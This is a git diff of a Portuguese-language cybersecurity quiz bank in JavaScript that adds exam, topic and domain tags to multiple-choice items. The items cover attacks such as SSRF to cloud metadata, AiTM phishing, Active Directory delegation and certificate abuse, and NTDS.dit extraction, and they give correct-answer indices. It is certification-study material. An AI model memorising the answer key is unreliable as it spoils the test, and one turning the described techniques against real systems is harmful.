         "question": "Em cenários de ameaça cibernética, o que descreve tipicamente o island hopping?",
@@ -17439,7 +17598,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Island hopping abusa da confiança num terceiro ligado (fornecedor/MSP/parceiro): compromete a ilha mais fraca e pivota para o alvo real. Não são transferências de disco por estafeta, não é só VLAN hopping local, nem a definição de rotação ultra-rápida de domínios C2.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "ccst-cyber",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Como é que os Domain Generation Algorithms (DGAs) ajudam tipicamente o malware a manter reachability de command-and-control?",
@@ -17451,7 +17613,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Os DGAs produzem muitos nomes possíveis; os atacantes registam os que precisam para o malware reencontrar o C2 após takedowns. Não são um único IP hard-coded, não são só /etc/hosts por USB, nem truques de LSDB OSPF em TXT.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "O que é server-side request forgery (SSRF)?",
@@ -17463,7 +17628,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "No SSRF o próprio servidor é usado como proxy, muitas vezes para chegar a sistemas só internos ou à metadata da cloud (ex.: 169.254.169.254) e roubar credenciais. A opção 1 descreve XSS, a 2 CSRF (falsificação do lado do cliente) e a 4 um SYN flood.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Como é que o domain fronting ajuda o malware a esconder o tráfego de comando e controlo (C2)?",
@@ -17475,7 +17643,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O domain fronting abusa de CDNs: as camadas visíveis (DNS, SNI) indicam um domínio de confiança, mas o cabeçalho Host interno encaminha o pedido para o serviço do atacante na mesma CDN, pelo que bloqueá-lo implica bloquear o domínio popular. A opção 1 é DGA, a 2 DNS hijacking/pharming e a 3 túnel ICMP.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.9"
       },
       {
         "question": "Durante a resposta a incidentes, que evidência deve normalmente ser recolhida primeiro segundo a ordem de volatilidade?",
@@ -17487,7 +17658,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A ordem de volatilidade manda capturar primeiro os dados mais efémeros: registos, cache, RAM, estado de processos e rede, depois ficheiros temporários, disco, logs remotos e por fim media de arquivo. Backups e imagens de disco são muito menos voláteis do que a memória.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "5.6"
       },
       {
         "question": "Um atacante carrega a página de transferências de um banco num iframe invisível num site de jogos e leva os utilizadores a clicar num botão Confirmar escondido. Que ataque é este e qual é uma defesa padrão?",
@@ -17499,7 +17673,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O clickjacking (UI redressing) sobrepõe uma página legítima num frame a um isco, para a vítima clicar em botões reais. A defesa é proibir o enquadramento com X-Frame-Options ou Content-Security-Policy frame-ancestors. Não há script injetado, nem SQL alterado, nem mexidas na resolução DNS.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "O domínio de um site malicioso resolve primeiro para o servidor do atacante com TTL muito curto e depois volta a resolver para 192.168.1.1, permitindo ao browser da vítima enviar pedidos para a página de administração do router de casa. Que técnica é esta?",
@@ -17511,7 +17688,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O DNS rebinding abusa de TTLs curtos: o hostname (mesma origem) passa a apontar para um IP privado e o JavaScript do atacante fala com dispositivos internos. Defesas: resolvers que bloqueiam respostas privadas para nomes públicos, validação do cabeçalho Host e autenticação nos serviços internos. Cache poisoning falsifica dados do resolver, DGA serve a resiliência de C2 e tunneling serve a exfiltração.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "O servidor de build de uma empresa descarrega um pacote interno chamado acme-utils. Um atacante publica acme-utils versão 99.0 no registo público npm e o build instala-o. Que ataque é este e qual é uma mitigação importante?",
@@ -17523,7 +17703,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "A dependency confusion explora gestores de pacotes que preferem a versão mais alta entre fontes públicas e privadas. Scopes/namespaces, um único registo privado (que faz proxy do público), versões fixas e lockfiles evitam-na. Typosquatting depende de nomes mal escritos, watering hole compromete um site que as vítimas visitam e man-in-the-browser é malware na sessão do browser.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "3.7"
       },
       {
         "question": "Um utilizador autenticado muda o URL /api/invoices/1043 para /api/invoices/1044 e vê a fatura de outro cliente. Que vulnerabilidade é esta?",
@@ -17535,7 +17718,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O IDOR (parte do Broken Access Control da OWASP) acontece quando a aplicação confia num ID de objeto vindo do cliente sem verificar se o utilizador autenticado lhe pode aceder. A correção é uma verificação de autorização no servidor para cada objeto (IDs aleatórios não chegam). CSRF forja pedidos a partir do browser da vítima, traversal usa ../ para chegar a ficheiros e session fixation reutiliza um ID de sessão definido antes.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Utilizadores com MFA por notificação push são alvo de phishing através de um reverse proxy que mostra a verdadeira página de login do Microsoft 365. Depois o atacante entra sem qualquer pedido de MFA. O que aconteceu e o que resiste melhor?",
@@ -17547,7 +17733,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Os kits AiTM (por exemplo Evilginx) fazem relay do login real, a vítima completa o MFA e o proxy captura o cookie de sessão, que o atacante reutiliza. FIDO2/passkeys estão ligadas ao domínio verdadeiro e não assinam para o domínio do proxy; acesso condicional e token binding também ajudam. MFA fatigue precisa de pedidos repetidos, SIM swapping ataca o SMS e spraying só adivinha passwords.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "Um funcionário clica num link e aprova uma app chamada 'PDF Viewer' que pede Mail.Read e offline_access no Microsoft 365. Mais tarde o correio continua a ser lido mesmo depois de a password ser reposta. O que é isto?",
@@ -17559,7 +17748,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "No consent phishing o atacante não precisa da password: o utilizador concede permissões delegadas a uma app OAuth maliciosa e o offline_access dá-lhe um refresh token que sobrevive à reposição da password. A correção é revogar o consentimento e os tokens da app e limitar o consentimento dos utilizadores a editores verificados ou aprovação de administrador. Credential stuffing e cookies roubados são cortados por uma reposição com revogação de sessões, e typosquatting é só um domínio parecido.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "Um formulário de login monta SQL com concatenação de strings a partir do campo username. Que defesa melhor impede SQL injection clássica aqui?",
@@ -17571,7 +17763,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Queries parametrizadas / prepared statements separam a instrução SQL dos valores ligados, por isso o input não altera a estrutura da query. Os WAF ajudam em profundidade mas falham payloads novos; hashear o username mantém a query concatenada; forçar numérico ajuda um campo mas não é correção geral e podem restar técnicas baseadas em erros.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
       },
       {
         "question": "No Windows, o ImagePath de um serviço é C:\\Program Files\\Vendor App\\service.exe sem aspas, e Authenticated Users pode escrever em C:\\Program Files\\Vendor App\\. Como pode um atacante local escalar para a conta do serviço?",
@@ -17583,7 +17778,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Caminhos de serviço sem aspas e com espaços fazem o Service Control Manager tentar C:\\Program.exe, depois C:\\Program Files\\Vendor.exe, e só depois o caminho real. Permissão de escrita numa pasta anterior permite deixar um binário que o SCM corre com a identidade do serviço (muitas vezes LocalSystem). Hijack do PATH é outro problema; dump LSASS com SeDebug é outra técnica; DependOnService não reinstala assim a partir de UNC.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "Que afirmação melhor distingue XSS armazenado (stored) de XSS refletido (reflected) numa aplicação web típica?",
@@ -17595,7 +17793,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O XSS stored (persistente) grava o payload num armazenamento da aplicação (comentário, perfil, ticket) para outros utilizadores o receberem e executarem mais tarde. O XSS reflected tira o payload do pedido e reflete-o nessa resposta (muitas vezes via URL maliciosa). HTTP/HTTPS e certificados de cliente não definem a diferença; nenhum dos tipos é sobre envenenar DNS/ARP; extensões não entram na classificação clássica.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.6"
       },
       {
         "question": "Um site bancário autentica POSTs com cookies de sessão. Que defesa melhor impede CSRF clássico numa transferência que altera estado?",
@@ -17607,7 +17808,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O CSRF clássico aproveita o envio automático de cookies do browser num pedido cross-site forjado. Tokens anti-CSRF (ou cookies SameSite estritos) fazem com que o pedido forjado não tenha um segredo que só a página legítima da app consegue ler. Desativar TLS não impede o envio de cookies; MD5 de um número de conta público não é segredo CSRF; ACAO * não bloqueia CSRF com credenciais e é o oposto de uma política CORS apertada.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Porque é que o UEFI Secure Boot (ou Measured Boot com atestações TPM) continua útil mesmo com o disco totalmente encriptado ao estilo BitLocker (FDE)?",
@@ -17619,7 +17823,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "A encriptação total de disco protege a confidencialidade dos dados em repouso, mas um bootloader ou kernel comprometido pode correr antes/durante o desbloqueio e subverter o SO. O Secure Boot verifica assinaturas dos componentes de boot; o Measured Boot/atestação regista hashes no TPM para verificação remota. O FDE não é substituído pelo Secure Boot; o Secure Boot não impede phishing; código de boot assinado continua a precisar de patches e não torna o SO isento de bugs.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.3"
       },
       {
         "question": "O que é que um ataque XML External Entity (XXE) explora principalmente num parser vulnerável?",
@@ -17631,7 +17838,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O XXE abusa de parsers XML que processam referências a entidades externas. Um documento manipulado pode fazer o servidor obter recursos file:// ou URLs HTTP internas (impacto por vezes semelhante a SSRF). Não é inundação DNS por DGA, não é spoofing ARP, nem ataque a Secure Boot/bootloader.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "ameacas",
+        "domain": "1.2"
       },
       {
         "question": "Na tradecraft de malware Windows, em que consiste principalmente o process hollowing?",
@@ -17643,7 +17853,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O process hollowing cria um processo legítimo em estado suspenso, esvazia (desmapeia) a imagem em memória, injeta código do atacante e retoma a execução para o payload correr sob um nome de processo de confiança. Não é ransomware só do MBR, não é DHCP/DNS rogue, nem AS-REP roasting (fraqueza de pré-autenticação Kerberos).",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "Para que serve principalmente o Microsoft Sysmon em endpoints Windows num desenho de monitorização blue team?",
@@ -17655,7 +17868,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O Sysmon (System Monitor) é um serviço/driver Windows que regista telemetria rica—criação de processos, ligações de rede, alterações a ficheiros/registo, etc.—no event log do Windows para SIEM ou detection engineering. Não substitui o Defender AV, não é BitLocker, nem um cliente VPN.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "logs-ir",
+        "domain": "3.5"
       },
       {
         "question": "O que tenta principalmente um bypass típico de WAF contra um web application firewall?",
@@ -17667,7 +17883,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Bypasses de WAF exploram falhas entre o que o WAF normaliza/corresponde e o que a app de backend aceita—encodings, confusão de paths, truques de verbo/content-type HTTP, etc. Não é inundação DNS por DGA, spoofing ARP, nem ataque a Secure Boot.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "2.1"
       },
       {
         "question": "Na tradecraft Windows, em que consiste principalmente o DLL sideloading?",
@@ -17679,7 +17898,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O DLL sideloading abusa de como as apps Windows resolvem caminhos de DLL: o atacante coloca uma DLL maliciosa que um binário legítimo assinado carrega, muitas vezes para se misturar em processos de confiança e contornar allow-lists simples. Não é ransomware só do MBR, DHCP/DNS rogue, nem AS-REP roasting.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "No Active Directory, porque é a delegação Kerberos unconstrained especialmente perigosa se um atacante comprometer esse host?",
@@ -17691,7 +17913,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Com delegação unconstrained, um computador/serviço recebe e pode reencaminhar TGTs de utilizadores que se ligam a ele, permitindo impersonação noutros serviços se o host for comprometido. Não desativa Kerberos para binds LDAP, não promove contas de serviço a Domain Admin, nem põe chaves BitLocker no SYSVOL.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "O que exploram principalmente as vulnerabilidades da família PrintNightmare num ambiente Windows?",
@@ -17703,7 +17928,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Problemas estilo PrintNightmare abusam do Print Spooler (e caminhos de instalação de drivers) para obter execução remota/local como SYSTEM. Mitigações: desativar o spooler onde não for preciso, restringir instalação de drivers e aplicar patches. Não é truque BGP Null0, troca de chaves Secure Boot, nem partilha anónima do NTDS.dit.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "2.8"
       },
       {
         "question": "No abuso de Active Directory Certificate Services (AD CS), em que se baseia principalmente a técnica ESC1?",
@@ -17715,7 +17943,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O ESC1 abusa de templates AD CS demasiado permissivos (ex.: EKU de autenticação de cliente, SAN indicado pelo enrollee, enrollment para Domain Users) para o atacante obter um certificado que impersona outro principal e depois o usa para autenticar. Não é roubo só do KRBTGT para Silver Ticket, interceptação Kerberos via WPAD/DHCP 252, nem GPO de SMB signing como núcleo do ESC1.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "Em que difere principalmente o RASP (Runtime Application Self-Protection) de um WAF tradicional de rede ou reverse-proxy?",
@@ -17727,7 +17958,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O RASP faz hook/instrumentação no runtime da aplicação (bibliotecas, interpretadores, agentes) para as deteções usarem caminhos de código, fluxos de dados e utilizadores reais—contexto que um WAF de perímetro normalmente não tem. Um WAF continua a filtrar na camada HTTP/política de edge. RASP não é inspeção BGP/OSPF, não remove TLS, nem é só uma sandbox offline.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "firewall-vpn",
+        "domain": "3.6"
       },
       {
         "question": "Para que se usa principalmente o BloodHound em avaliações de segurança de Active Directory?",
@@ -17739,7 +17973,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O BloodHound (e collectors como SharpHound) enumeram relações e ACLs do AD num grafo para analistas/atacantes encontrarem caminhos de escalonamento de privilégios (ex.: até Domain Admin). Não roda o KRBTGT periodicamente, não é um WAF anti-Kerberoasting, nem cifra o LSASS por si.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "1.3"
       },
       {
         "question": "No abuso moderno de Active Directory, em que consistem principalmente as Shadow Credentials?",
@@ -17751,7 +17988,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Shadow Credentials abusam do atributo msDS-KeyCredentialLink (muitas vezes no modelo Key Trust / Windows Hello for Business) para quem puder escrever esse atributo adicionar o seu material de chave e obter tickets da vítima via PKINIT. Não é SPN no krbtgt para unconstrained delegation, nem só uma GPO a desligar signing/binding, nem troca de DANE TLSA.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "Num dispositivo Windows joined ao Microsoft Entra ID, para que serve principalmente um Primary Refresh Token (PRT)?",
@@ -17763,7 +18003,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "Um PRT é emitido a dispositivos Entra-joined/hybrid-joined e permite SSO: o dispositivo obtém access tokens para recursos cloud sem pedir credenciais repetidamente. O roubo/abuso do PRT é um risco estilo living-off-cloud. Não é escrow BitLocker, nem hash SAM/NTLM para replay, nem um SAS anónimo de todo o tenant.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.1"
       },
       {
         "question": "Em ambientes cloud, porque é especialmente perigoso um SSRF que alcança o instance metadata service (IMDS, ex. 169.254.169.254)?",
@@ -17775,7 +18018,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O IMDS muitas vezes entrega credenciais IAM (ou tokens de curta duração) à instância. Um SSRF que consulte esse endpoint link-local pode roubar essas credenciais e abusar das APIs cloud. Não é só um truque de hostname/DNS, nem um enabler de BGP spoof, nem um downgrade SSLv3 de todo o TLS de saída.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "rede-cloud",
+        "domain": "3.1"
       },
       {
         "question": "Em que consiste principalmente um ataque de phishing com OAuth device code?",
@@ -17787,7 +18033,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O fluxo device authorization mostra um user code e um URI de verificação. Os atacantes levam a vítima a aprovar a app do atacante (muitas vezes numa página convincente), obtendo tokens. Não é reescrita Bearer via LSASS, nem forge SAML que desliga MFA e TLS, nem troca permanente do JWKS.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.4"
       },
       {
         "question": "No Windows, o que consegue principalmente um atacante local ao abusar de SeImpersonatePrivilege (ex. técnicas da família Potato)?",
@@ -17799,7 +18048,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "SeImpersonatePrivilege deixa um processo impersonar clientes que se ligam a ele. Ataques estilo Potato forçam um serviço privilegiado a autenticar-se no pipe/listener do atacante e depois impersonam esse token de alto privilégio (muitas vezes SYSTEM). Não é reescrita do KRBTGT, bypass do Tamper Protection/ELAM por si, nem downgrade forçado de todo o SMB para NTLMv1.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "O que força principalmente um ataque estilo PetitPotam um host Windows (muitas vezes um DC) a fazer?",
@@ -17811,7 +18063,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O PetitPotam abusa do MS-EFSRPC (e similares) para forçar autenticação para o atacante. Combinado com NTLM relay (ou técnicas relacionadas), pode levar a compromisso adicional do domínio. Não é por si uma reescrita do KRBTGT, bypass do Credential Guard por hive, nem downgrade forçado de todo o SMB para NTLMv1.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.5"
       },
       {
         "question": "O que permitia principalmente a vulnerabilidade Zerologon (CVE-2020-1472) a um atacante na rede contra um domain controller sem patch?",
@@ -17823,7 +18078,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O Zerologon abusava de uma falha criptográfica do Netlogon (IV a zeros) para um atacante se fazer passar por cliente e definir a password da conta máquina do DC para um valor conhecido/vazio, abrindo caminho a takeover. Não é roubo de chaves BitLocker só com tags GCM vazias, nem um interruptor do Tamper Protection, nem Golden Tickets sem KRBTGT.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "O que protege principalmente o Windows Credential Guard num host suportado?",
@@ -17835,7 +18093,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O Credential Guard usa segurança baseada em virtualização para isolar segredos, impedindo malware com direitos de admin de os extrair simplesmente do LSASS. Não impede sozinho Golden Tickets no domínio, não desliga todo o NetNTLM/relay, nem serve de anti-ransomware por encriptação de disco.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "endpoint",
+        "domain": "5.1"
       },
       {
         "question": "O que abusa principalmente um ataque DCShadow na replicação do Active Directory?",
@@ -17847,7 +18108,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "O DCShadow faz uma máquina comportar-se como DC e injeta alterações controladas pelo atacante na replicação AD. Não é coerção PetitPotam, edição offline do KRBTGT nem inundação de TGTs forjados.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Porque adicionam por vezes os atacantes uma ACE de backdoor no objeto AdminSDHolder do Active Directory?",
@@ -17859,7 +18123,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O SDProp (Security Descriptor Propagator) reaplica periodicamente a ACL do AdminSDHolder a grupos protegidos (ex. Domain Admins). Uma ACE de backdoor aí pode restaurar direitos do atacante após limpeza. Não guarda KRBTGT em claro, não dá admin local nas estações nem desativa a pré-autenticação.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Como difere o overpass-the-hash (pass-the-key) do pass-the-hash clássico contra o Active Directory?",
@@ -17871,7 +18138,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O overpass-the-hash / pass-the-key transforma uma chave/hash roubada num TGT Kerberos (ex. via mimikatz), e o acesso seguinte usa tickets em vez de PtH NTLM bruto em cada recurso. Não é só LM, não reescreve o KRBTGT nem desativa assinatura SMB por GPO.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Num ataque Golden SAML contra um ambiente federado como o AD FS, o que é que o atacante rouba e abusa principalmente?",
@@ -17883,7 +18153,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Golden SAML é roubar a chave de assinatura de tokens do servidor de federação e forjar asserções SAML assinadas para qualquer utilizador, contornando muitas vezes o MFA no service provider. Não é abuso do KRBTGT, spoofing DHCP nem relay SMTP.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "1.5"
       },
       {
         "question": "Um atacante pode escrever no atributo msDS-AllowedToActOnBehalfOfOtherIdentity de um objeto de computador alvo e controla uma conta de máquina. O que lhe permite o abuso de resource-based constrained delegation?",
@@ -17895,7 +18168,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Com escrita no msDS-AllowedToActOnBehalfOfOtherIdentity, o atacante permite à sua conta de máquina delegar no alvo e usa S4U2Self/S4U2Proxy para se fazer passar por um utilizador privilegiado nesse host. Não repõe o KRBTGT, não desativa a pré-autenticação nem depende de scripts SYSVOL.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Numa rede Windows que não usa IPv6 ativamente, como é que um ataque do tipo mitm6 se coloca normalmente entre os clientes e a rede?",
@@ -17907,7 +18183,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "O Windows prefere IPv6 e pede DHCPv6 por omissão. O mitm6 responde como servidor DHCPv6 falso, define-se como DNS e depois captura ou faz relay de autenticações (por exemplo para LDAP). Mitiga-se bloqueando DHCPv6/RA falsos ou desativando IPv6 não usado e exigindo LDAP signing.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "Numa LAN Windows em que os anfitriões ainda fazem fallback para LLMNR ou NBT-NS na resolução de nomes, como funciona tipicamente um ataque ao estilo Responder?",
@@ -17919,7 +18198,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 3,
         "explanation": "Ferramentas ao estilo Responder envenenam LLMNR/NBT-NS respondendo quando o DNS falha e depois capturam ou fazem relay da autenticação. Não precisam de alterar DNS via GPO no SYSVOL, desativar Kerberos nem de DHCP starvation como mecanismo central.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "ameacas",
+        "domain": "2.5"
       },
       {
         "question": "No abuso de AD CS, o que combina principalmente o cenário ESC8 para obter um certificado no contexto de uma máquina ou utilizador privilegiado?",
@@ -17931,7 +18213,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "O ESC8 abusa de relay NTLM para o web enrollment HTTP do AD CS quando faltam proteções como EPA, permitindo pedir um certificado no contexto da vítima retransmitida. Não é sobretudo roubo offline da chave da CA, delegação não constrangida em templates nem troca da CA raiz via GPO.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "scor",
+        "topic": "cripto",
+        "domain": "1.5"
       },
       {
         "question": "Depois de comprometer uma estação de trabalho, um atacante quer decifrar as passwords de browser guardadas e as chaves Wi-Fi do utilizador protegidas pelo DPAPI do Windows. Qual é uma abordagem realista?",
@@ -17943,7 +18228,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
         "explanation": "Os blobs DPAPI são cifrados com uma masterkey derivada das credenciais do utilizador; com a password/hash do utilizador ou a chave de backup do domínio, um atacante recupera a masterkey e decifra os segredos guardados. Os blobs não estão em texto limpo, e o modo de segurança ou limpar a password não removem o DPAPI.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "endpoint",
+        "domain": "3.2"
       },
       {
         "question": "Com direitos de administrador num controlador de domínio, um atacante quer todos os hashes de password do domínio offline. Porquê usar uma Volume Shadow Copy (vssadmin/ntdsutil) para obter o NTDS.dit?",
@@ -17955,7 +18243,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O NTDS.dit em uso está bloqueado pelo NTDS, por isso os atacantes usam uma Volume Shadow Copy ou ntdsutil IFM para obter uma cópia consistente da base mais a hive SYSTEM (boot key) e extrair hashes offline. O ficheiro é cifrado, não um CSV em texto limpo, e as shadow copies não desativam a replicação nem exfiltram para a cloud.",
-        "difficulty": "Difícil"
+        "difficulty": "Difícil",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Um utilizador concluiu o MFA e tem uma sessão cloud ativa. Um atacante rouba o cookie de sessão do browser e reenvia-o. Porque é que isto pode contornar o MFA?",
@@ -17967,7 +18258,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 0,
         "explanation": "Um cookie de sessão representa uma sessão já autenticada; reenviar um cookie válido e não expirado (pass-the-cookie) deixa o atacante reutilizar a sessão pós-MFA sem reautenticar. Os cookies não contêm a password em texto limpo nem o OTP, o MFA não é uma verificação única por vida, e os cookies não desativam o TLS.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "scor",
+        "topic": "identidade",
+        "domain": "6.7"
       },
       {
         "question": "Depois de obter execução de código como SYSTEM num controlador de domínio, um atacante quer que qualquer conta autentique com uma password mestra enquanto as passwords reais continuam a funcionar. Que técnica de persistência corresponde?",
@@ -17979,7 +18273,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 2,
         "explanation": "O Skeleton Key faz patch ao LSASS num controlador de domínio para uma password mestra escolhida pelo atacante funcionar para qualquer conta a par das passwords reais. Pass-the-hash, Kerberoasting e AS-REP roasting não instalam esse backdoor de password dupla em todo o DC.",
-        "difficulty": "Médio"
+        "difficulty": "Médio",
+        "exam": "cbrops",
+        "topic": "identidade",
+        "domain": "2.8"
       },
       {
         "question": "Um parque Windows reforçado aplica allowlisting de aplicações com WDAC (ou AppLocker). Porque é que binários living-off-the-land ainda podem enfraquecer esse controlo?",
@@ -17991,7 +18288,10 @@ window.QUIZ_BANK = {
         ],
         "correct": 1,
